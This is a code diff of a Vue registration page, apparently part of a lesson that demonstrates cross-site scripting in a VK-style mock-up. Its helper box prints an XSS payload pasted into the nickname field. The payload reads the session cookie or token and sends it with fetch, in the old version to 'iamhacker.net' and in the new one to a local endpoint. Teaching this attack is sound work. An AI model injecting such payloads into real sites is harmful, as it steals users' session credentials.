@@ -12,27 +12,56 @@
 
     <div class="vk__registration__form">
       <p style="font-size: 1.5vw; font-weight: 500">РЕГИСТРАЦИЯ</p>
-      <input class="vk__registration__input" placeholder="Никнейм" type="text"/>
-      <input class="vk__registration__input" placeholder="Пароль" type="password"/>
-      <button class="vk__registration__btn">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+      <input
+          class="vk__registration__input"
+          placeholder="Никнейм"
+          type="text"
+          v-model="username"
+      />
+      <input
+          class="vk__registration__input"
+          placeholder="Пароль"
+          type="password"
+      />
+      <button
+          class="vk__registration__btn"
+          @click="isRegister"
+      >
+        ЗАРЕГИСТРИРОВАТЬСЯ
+      </button>
     </div>
     <anonymous-modal text-message="Тут мы введём никнейм (имя) пользователя c  закрывающим
                                   <br />HTML-тегом и скриптом, в котором будет код, отправляющий данные пользователя на адрес хакера.
                                   <br /><br />Рассмотрите и скопируйте код из чёрного окна, вставьте в поле “Никнейм”."></anonymous-modal>
       <div class="vk__helper__message">
-        <span>NoName&lt;/span&gt;&lt;script&gt;<br/>
-        const username = document.querySelector('.username').textContent;<br/>
-        const sessionCookie = document.cookie.match(/session-token=([^;$]+)/)[1];<br/>
-        console.log(username, sessionCookie);<br/>
-        fetch('http:/iamhacker.net',{<br/>
+        <span>NoName&lt;/p&gt;&lt;script&gt;<br/>
+        const username = sessionStorage.getItem('username');<br/>
+        const token = sessionStorage.getItem('token');<br/>
+        console.log(username, token);<br/>
+        fetch('http://localhost:8080/startXSS',{<br/>
         method: 'post',<br/>
-        body:JSON.stringify({username,sessionCookie})});&lt;/script&gt;</span>
+        body:JSON.stringify({username,token})});&lt;/script&gt;&lt;p&gt;</span>
       </div>
   </div>
 </template>
 
 <script>
-export default {}
+export default {
+  data() {
+    return {
+      username: '',
+      password: '',
+    };
+  },
+  methods: {
+    isRegister() {
+      const token = Math.random().toString(36);
+      sessionStorage.setItem('username', this.username);
+      sessionStorage.setItem('token', token);
+      this.$router.push(`/startXSS`);
+    }
+  }
+}
 </script>
 
 <style scoped>
